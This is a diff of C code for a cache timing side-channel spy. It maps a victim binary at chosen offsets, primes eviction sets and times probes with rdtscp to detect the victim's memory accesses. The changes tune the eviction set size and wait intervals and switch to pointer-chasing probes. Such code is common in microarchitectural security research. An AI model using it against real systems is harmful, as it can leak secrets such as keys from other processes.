@@ -43,6 +43,7 @@ Target *map(char *file_name, uint64_t offset)
     }
     close(file_descriptor);
     target->adrs = (void *)(((uint64_t) target->mapping) + offset);
+    printf("%p %p 0x%lx\n", target->mapping, target->adrs, offset);
     return target;    
 }
 
@@ -170,8 +171,8 @@ void my_monitor(Config *spy_conf, Targets *targets){
         // Print information on first iteration.
         int first=targets->number;
 
-        // wait 3000*no. of targets, eviction takes ~1900 cycles
-        unsigned long long diff = 3000*first;
+        // wait 4000*no. of targets, eviction w 16 elems takes 1900 cycles, w 27 elems takes 3700 cycles
+        unsigned long long diff = 4000*first;
         while(1){
             old_tsc=tsc;
             __asm__ __volatile__ ("rdtscp" : "=A" (tsc));
@@ -179,16 +180,16 @@ void my_monitor(Config *spy_conf, Targets *targets){
 
             // probe
             for(size_t i=0; i<targets->number; i++){
-                targets->addresses[i]->msrmts[ctr]=probe_evset_single(targets->addresses[i]->adrs);
+                targets->addresses[i]->msrmts[ctr]=probe_evset_chase(spy_conf, targets->addresses[i]->evset);
             }
 
-            // evict
+            // probe
             for(size_t i=0; i<targets->number; i++){
-                if(first>0) printf("%lu, %lx, %p\n", i, targets->addresses[i]->offset, targets->addresses[i]->evset);
+                if(first>0) printf("%lu, 0x%lx, %p\n", i, targets->addresses[i]->offset, targets->addresses[i]->evset);
                 if(first-->0) list_print(targets->addresses[i]->evset);
-                probe_evset_chase(spy_conf, targets->addresses[i]->evset);
+                // probe_evset_chase(spy_conf, targets->addresses[i]->evset);
                 // Maybe toggle during actual attack.
-                if(targets->addresses[i]->msrmts[ctr] < spy_conf->threshold) printf("[i] my_monitor: detected 0x%lx: ctr %d, hit ctr %d\n", targets->addresses[i]->offset, ctr, ++hit_ctr[i]);
+                // if(targets->addresses[i]->msrmts[ctr] > 1900) printf("[i] my_monitor: detected 0x%lx: ctr %d, hit ctr %d\n", targets->addresses[i]->offset, ctr, ++hit_ctr[i]);
             }        
 
             if(ctr++ >= MSRMT_BUFFER) {
@@ -204,7 +205,7 @@ void my_monitor(Config *spy_conf, Targets *targets){
 }
 
 void spy(char *victim_filepath, char *offset_filepath){
-    Config *spy_conf= config_init(27, 2048, 64, 110, 2097152);
+    Config *spy_conf= config_init(16, 2048, 64, 110, 2097152);
     Targets *targets = init_spy(spy_conf, victim_filepath, offset_filepath);
     printf("[+] spy: spy init complete, monitoring");
     for(size_t i=0; i<targets->number; i++){
